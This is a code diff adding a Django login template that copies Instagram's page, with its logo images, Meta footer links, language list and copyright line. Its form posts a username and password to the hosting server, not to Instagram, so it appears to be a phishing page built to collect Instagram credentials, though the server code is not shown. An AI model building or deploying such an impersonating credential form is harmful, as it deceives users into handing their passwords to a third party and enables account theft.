@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<style>
+      .wrapper {
+        width: 100%;
+        height: 700px;
+        margin-bottom: 7%;
+      }
+    
+      .main {
+        display: flex;
+        align-items: start;
+        justify-content: center;
+        gap: 20px;
+        text-align: center;
+        padding: 40px;
+      }
+    
+      .line_wrap {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 20px;
+        margin-bottom: 15px;
+        font-size: 13px;
+        border-color: gainsboro !important;
+        margin-top: 15px;
+      }
+    
+      .login-link {
+        margin-bottom: 20px;
+      }
+    
+      .line {
+        width: 90px;
+      }
+    
+      .box2 {
+        display: flex;
+        align-items: center;
+        justify-content: start;
+        flex-direction: column;
+      }
+    
+      .ul-li-wrap ul {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 13px;
+        padding-top: 30px;
+      }
+    
+      .ul-li-wrap ul li {
+        list-style-type: none;
+      }
+    
+      .ul-li-wrap ul li a {
+        text-decoration: none;
+        font-size: 13px;
+        color: #7a7d82;
+        letter-spacing: 0.4px;
+      }
+    
+      .wrap-bottom select {
+        border: none;
+        background-color: transparent;
+        max-width: 90px;
+        color: #7a7d82;
+      }
+    
+      .wrap-bottom {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 20px;
+        gap: 10px;
+      }
+    
+      .wrap-bottom p {
+        color: #7a7d82;
+        font-size: 13px;
+      }
+    
+      .ul-li-wrap ul li a:hover {
+        text-decoration: underline;
+      }
+    
+      .bottom-img {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 5px;
+      }
+    
+      .bottom-img img {
+        width: 134px;
+        height: 43px;
+      }
+    
+      .box2 input {
+        width: 230px;
+        height: 30px;
+        margin-bottom: 5px;
+        font-size: 11px;
+        padding-left: 15px;
+        border: 1px solid #e4e6eb;
+        border-radius: 4px;
+      }
+    
+      .i {
+        background-position: 0px -52px;
+        background-size: auto;
+        width: 175px;
+        height: 51px;
+        background-repeat: no-repeat;
+        display: inline-block;
+        margin-top: 1px;
+        margin-bottom: 30px;
+      }
+    
+      .box {
+        width: 455px;
+        height: 575px;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-size: contain;
+        position: relative;
+      }
+    
+      .box1 {
+        width: 320px;
+        height: 60px;
+        margin-top: 10px;
+        border: 1px solid gainsboro;
+    
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+    
+      .box img {
+        position: absolute;
+        left: -248px;
+        top: 20px;
+        height: 500px;
+        width: 235px;
+      }
+    
+      .box2 button {
+        width: 250px;
+        height: 30px;
+        margin-top: 15px;
+        background: #5aa7ff;
+        color: #fff;
+        border-radius: 8px;
+      }
+    
+      .box2 {
+        width: 320px;
+        height: 365px;
+        padding-top: 40px;
+        margin-top: 10px;
+        border: 1px solid gainsboro;
+        margin-bottom: 20px;
+      }
+    
+      .fa-square-facebook {
+        color: #385185;
+      }
+    
+      .facebok {
+        margin-top: 0px;
+      }
+    
+      .facebok span {
+        color: #385185;
+        margin-top: 0px;
+        font-weight: 400;
+        font-size: 14px;
+        font-weight: bold;
+        font-family: sans-serif;
+      }
+    
+      .box3 {
+        padding: 7px 40px;
+        margin-top: 5px;
+        margin-left: 35px;
+      }
+    
+      .box4 {
+        padding: 5px 40px;
+        margin-left: 35px;
+        margin-top: 10px;
+      }
+    
+      .box5 {
+        padding: 5px 105px;
+        margin-left: 35px;
+        margin-top: 15px;
+        background-color: deepskyblue;
+        border-radius: 10px;
+        color: white;
+      }
+      @media (max-width: 500px) {
+        .box {
+          display: none !important;
+        }
+       
+        .ul-li-wrap ul {
+          flex-wrap: wrap;
+        }
+      }
+</style>
+<body>
+    <div class="wrapper">
+      <div class="main">
+        <div class="box" style="background-image: url({% static 'img/photoi.jpg'%})">
+          <img src="{% static 'img/insta1.png'%}" alt="" />
+        </div>
+        <div class="box0">
+          <form class="box2" method="post">
+            {% csrf_token %}
+            <i
+              class="i"
+              style="background-image: url({% static 'img/insta.png'%})"
+            ></i>
+            <input
+              type="text"
+              placeholder="Phone number, username, or email"
+              name="login"
+            />
+            <input type="password" placeholder="Password" name="password" />
+            <button tupe="submit">Log in</button>
+            <div class="line_wrap">
+              <hr class="line" />
+              <p>OR</p>
+              <hr class="line" />
+            </div>
+            <div class="facebok">
+              <i class="fa-brands fa-square-facebook"></i>
+              <span>Log in with Facebook</span>
+            </div>
+            <p
+              style="
+                font-size: 14px;
+                font-weight: 500;
+                color: #323436;
+                margin-top: 10px;
+              "
+            >
+              Forgot password?
+            </p>
+          </form>
+          <div class="box1">
+            <p class="login-link">
+              Don't have an account? <a href="/register/">Sign up</a>
+            </p>
+          </div>
+          <h3 style="font-size: 15px; font-weight: 400; margin: 20px">
+            Get the app.
+          </h3>
+          <div class="bottom-img">
+            <a href="#"> <img src="{% static 'img/play.png'%}" alt="" /></a>
+            <a href="#">
+              <img src="{% static 'img/micr.png'%}" alt="" />
+            </a>
+          </div>
+        </div>
+      </div>
+      <div class="ul-li-wrap">
+        <ul>
+          <li><a href="https://about.meta.com/">Meta</a></li>
+          <li><a href="#">About</a></li>
+          <li><a href="#">Blog</a></li>
+          <li><a href="#">Jobs</a></li>
+          <li><a href="#">Help</a></li>
+          <li><a href="#">API</a></li>
+          <li><a href="#">Privacy</a></li>
+          <li><a href="#">Terms</a></li>
+          <li><a href="#">Locations</a></li>
+          <li><a href="#">Instagram Lite</a></li>
+          <li><a href="#">Threads</a></li>
+          <li><a href="#">Contact Uploading & Non-Users</a></li>
+          <li><a href="#">Meta Verified</a></li>
+        </ul>
+      </div>
+      <div class="wrap-bottom">
+        <select>
+          <option value="af">Uzbekistan</option>
+          <option value="ar">العربية</option>
+          <option value="cs">Čeština</option>
+          <option value="da">Dansk</option>
+          <option value="de">Deutsch</option>
+          <option value="el">Ελληνικά</option>
+          <option value="en">English</option>
+          <option value="en-gb">English (UK)</option>
+          <option value="es">Español (España)</option>
+          <option value="es-la">Español</option>
+          <option value="fa">فارسی</option>
+          <option value="fi">Suomi</option>
+          <option value="fr">Français</option>
+          <option value="he">עברית</option>
+          <option value="id">Bahasa Indonesia</option>
+          <option value="it">Italiano</option>
+          <option value="ja">日本語</option>
+          <option value="ko">한국어</option>
+          <option value="ms">Bahasa Melayu</option>
+          <option value="nb">Norsk</option>
+          <option value="nl">Nederlands</option>
+          <option value="pl">Polski</option>
+          <option value="pt-br">Português (Brasil)</option>
+          <option value="pt">Português (Portugal)</option>
+          <option value="ru">Русский</option>
+          <option value="sv">Svenska</option>
+          <option value="th">ภาษาไทย</option>
+          <option value="tl">Filipino</option>
+          <option value="tr">Türkçe</option>
+          <option value="zh-cn">中文(简体)</option>
+          <option value="zh-tw">中文(台灣)</option>
+          <option value="bn">বাংলা</option>
+          <option value="gu">ગુજરાતી</option>
+          <option value="hi">हिन्दी</option>
+          <option value="hr">Hrvatski</option>
+          <option value="hu">Magyar</option>
+          <option value="kn">ಕನ್ನಡ</option>
+          <option value="ml">മലയാളം</option>
+          <option value="mr">मराठी</option>
+          <option value="ne">नेपाली</option>
+          <option value="pa">ਪੰਜਾਬੀ</option>
+          <option value="si">සිංහල</option>
+          <option value="sk">Slovenčina</option>
+          <option value="ta">தமிழ்</option>
+          <option value="te">తెలుగు</option>
+          <option value="ur">اردو</option>
+          <option value="vi">Tiếng Việt</option>
+          <option value="zh-hk">中文(香港)</option>
+          <option value="bg">Български</option>
+          <option value="fr-ca">Français (Canada)</option>
+          <option value="ro">Română</option>
+          <option value="sr">Српски</option>
+          <option value="uk">Українська</option>
+        </select>
+        <p>© 2024 Instagram from Meta</p>
+      </div>
+    </div>
+</body>
+</html>
